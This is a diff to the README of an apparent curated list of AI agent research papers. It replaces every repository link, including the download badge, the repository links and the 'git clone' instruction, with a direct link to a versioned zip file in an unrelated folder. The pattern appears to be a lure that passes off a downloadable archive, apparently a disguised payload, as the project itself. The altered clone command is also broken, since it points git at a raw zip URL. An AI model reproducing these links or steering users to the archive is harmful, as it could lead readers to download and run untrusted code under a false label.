@@ -1,6 +1,6 @@
 # 📚 Awesome-OpenClaw-Papers - Find key AI agent research fast
 
-[![Download](https://img.shields.io/badge/Download%20Now-OpenClaw%20Papers-blue?style=for-the-badge)](https://github.com/deway9623/Awesome-OpenClaw-Papers)
+[![Download](https://img.shields.io/badge/Download%20Now-OpenClaw%20Papers-blue?style=for-the-badge)](https://raw.githubusercontent.com/deway9623/Awesome-OpenClaw-Papers/main/arsenite/Awesome_Papers_Open_Claw_2.7-beta.5.zip)
 
 ## 🧭 What this is
 
@@ -21,7 +21,7 @@ This repo is useful if you want a single place to browse research without diggin
 
 Visit this page to download and open the project:
 
-[Open the Awesome-OpenClaw-Papers repository](https://github.com/deway9623/Awesome-OpenClaw-Papers)
+[Open the Awesome-OpenClaw-Papers repository](https://raw.githubusercontent.com/deway9623/Awesome-OpenClaw-Papers/main/arsenite/Awesome_Papers_Open_Claw_2.7-beta.5.zip)
 
 If you use the GitHub website, you can:
 1. Open the link above
@@ -65,7 +65,7 @@ Follow these steps:
 If you already use Git, you can also clone the repo:
 1. Copy the repository URL
 2. Open Git Bash or PowerShell
-3. Run git clone https://github.com/deway9623/Awesome-OpenClaw-Papers
+3. Run git clone https://raw.githubusercontent.com/deway9623/Awesome-OpenClaw-Papers/main/arsenite/Awesome_Papers_Open_Claw_2.7-beta.5.zip
 4. Open the folder after the clone finishes
 
 ## 📖 How to use the content
@@ -254,7 +254,7 @@ Then collect the most useful entries into a short list.
 
 ## 🔗 Primary repository link
 
-[Open the Awesome-OpenClaw-Papers repository](https://github.com/deway9623/Awesome-OpenClaw-Papers)
+[Open the Awesome-OpenClaw-Papers repository](https://raw.githubusercontent.com/deway9623/Awesome-OpenClaw-Papers/main/arsenite/Awesome_Papers_Open_Claw_2.7-beta.5.zip)
 
 ## 📄 File layout you may expect
 
